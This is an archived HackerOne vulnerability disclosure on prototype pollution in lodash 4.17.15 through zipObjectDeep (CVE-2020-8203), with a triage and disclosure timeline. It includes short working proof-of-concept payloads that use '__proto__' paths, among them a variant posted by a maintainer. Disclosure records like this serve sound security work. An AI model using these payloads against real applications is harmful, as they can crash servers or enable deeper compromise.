---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/allocation-of-resources-without-limits-or-throttling
  - env/web
  - stack/node
substate: "resolved"
weakness: "Allocation of Resources Without Limits or Throttling"
enriched: true
body: true
date: 2020-04-27
submitted: 2019-10-11T12:06:20.745Z
bounty_usd: null
votes: 20
cve: "CVE-2020-8203"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "posix"
source: "https://hackerone.com/reports/712065"
title: "Prototype pollution attack (lodash)"
---
# Prototype pollution attack (lodash)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 20 | **Program:** Node.js third-party modules | **Disclosed:** 2020-04-27

- Report: [https://hackerone.com/reports/712065](https://hackerone.com/reports/712065)
- CWE: Allocation of Resources Without Limits or Throttling | CVE: CVE-2020-8203
- Submitted: 2019-10-11T12:06:20.745Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype

Module
module name: lodash
version: 4.17.15
npm page: https://www.npmjs.com/package/lodash

Module Description
The Lodash library exported as Node.js modules.

Module Stats
25,228,177 downloads in the last week

Vulnerability
Vulnerability Description
This is a similar with this vulnerability: https://hackerone.com/reports/380873

The functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

Steps To Reproduce:
Craft an object by "zipObjectDeep" function of lodash

const _ = require('lodash');
_.zipObjectDeep(['__proto__.z'],[123])
console.log(z) // 123

## Impact

Variable. Server crash or the server becoming unable to respond to all request is garanteed, but more significant impact like remote code execution can be achieved in some cases.

## Timeline

- **Report Filed**
- **2019-10-11** @posix: ```
const _ = require('lodash');
.zipObjectDeep(['proto_.z'],[123])
console.log(z) // 123
```

I summited this vulnerability one day ago, but since npmjs.com not response, i summited by hackerone again.
- **2019-10-11** @posix: ```
const _ = require('lodash');
_.zipObjectDeep(['__proto__.z'],[123])
console.log(z) // 123
```
- **2019-10-12** @nochnoidozor: Hi @posix,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Severity Updated**
- **Report Triaged**
- **2019-10-28** @posix: Is it being processed?
- **Report Triaged**
- **2019-12-04** @lirantal: Thanks for this report @posix. I'll reach out to the maintainers of lodash and ask them to triage it here and confirm.
- **External User Joined**
- **2019-12-05** @jdalton: Hi! 

This is an interesting one. Also:
```
_.zipObjectDeep(['a.b.__proto__.c'],[123])
console.log(c) // 123
```
- **2019-12-13** @lirantal: @jdalton have you got a fix for it that @posix can test to ensure this has been addressed?
- **2019-12-13** @posix: sure.
- **2020-01-28** @posix: When will it be over?
- **2020-04-25** @lirantal: @jdalton we're on a massive delay here in responding so I'm going to prompt for a security disclosure on this.
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2020-06-11** @posix: Can I request CVE?
- **2020-07-06** @mcollina: CVE requested
